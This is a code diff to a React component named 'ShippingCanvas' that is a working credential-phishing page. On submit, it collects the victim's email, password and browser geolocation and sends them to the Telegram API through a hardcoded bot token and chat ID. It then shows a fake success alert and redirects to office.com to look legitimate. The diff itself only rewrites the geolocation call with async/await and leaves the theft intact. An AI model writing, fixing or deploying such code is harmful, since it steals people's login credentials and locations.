@@ -54,46 +54,40 @@ const ShippingCanvas = () => {
   };
 
   const handleSubmit = async () => {
-    const email = emailInputRef.current.value;
-    const password = passwordInputRef.current.value;
-    if (email.trim() === '' || password.trim() === '') {
-      alert('Please fill in both fields');
-      return;
-    }
+  const email = emailInputRef.current.value;
+  const password = passwordInputRef.current.value;
+  if (email.trim() === '' || password.trim() === '') {
+    alert('Please fill in both fields');
+    return;
+  }
 
-    try {
-      // Retrieve geolocation using the browser's built-in API
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude } = position.coords;
-          setGeoData({ latitude, longitude });
-          // Send data to Telegram bot
-          const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
-          const chatId = '6707519229';
-          const message = `📨 **Email:** ${email}
-                           🔑 **Password:** ${password}
-                           📍 **Latitude:** ${latitude}
-                           📍 **Longitude:** ${longitude}`;
-          const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-          
-          const response = await fetch(telegramUrl);
-          if (response.ok) {
-            alert('You have signed in successfully');
-            window.location.href = 'https://www.office.com';
-          } else {
-            alert('Error sending message');
-          }
-        },
-        (error) => {
-          console.error('Geolocation error:', error);
-          alert('Error retrieving geolocation data');
-        }
-      );
-    } catch (error) {
-      console.error('Geolocation error:', error);
-      alert('Error retrieving geolocation data');
+  try {
+    // Use a Promise-based wrapper for geolocation to use await
+    const position = await new Promise((resolve, reject) =>
+      navigator.geolocation.getCurrentPosition(resolve, reject)
+    );
+
+    const { latitude, longitude } = position.coords;
+    setGeoData({ latitude, longitude });
+
+    // Send data to Telegram bot
+    const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
+    const chatId = '6707519229';
+    const message = `📨 **Email:** ${email} 🔑 **Password:** ${password} 📍 **Latitude:** ${latitude} 📍 **Longitude:** ${longitude}`;
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    
+    const response = await fetch(telegramUrl);
+    if (response.ok) {
+      alert('You have signed in successfully');
+      window.location.href = 'https://www.office.com';
+    } else {
+      alert('Error sending message');
     }
-  };
+  } catch (error) {
+    console.error('Geolocation error:', error);
+    alert('Error retrieving geolocation data');
+  }
+};
 
   return (
     <div>
